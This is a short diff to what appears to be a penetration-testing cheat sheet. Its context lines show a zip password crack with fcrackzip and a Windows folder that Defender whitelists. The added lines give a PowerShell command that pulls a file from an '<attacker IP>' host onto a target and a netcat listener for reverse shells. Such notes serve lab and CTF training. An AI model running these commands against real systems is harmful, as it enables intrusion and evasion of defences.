@@ -76,3 +76,12 @@ $ fcrackzip -u -D -p '/w/rockyou.txt' -v file.zip
 ## World-write/readable Directory, Windows Defender whitelist, and on UAC bypass list
 ```C:\Windows\System32\spool\drivers\color\```
 
+## Powershell
+
+### Downloading files onto target machine
+```powershell -c Invoke-WebRequest -uri 'http://<attacker IP>/<file>```
+
+# PostSploit
+
+## Arrow-support for nc
+```rlwrap nc -nvlp 4444```
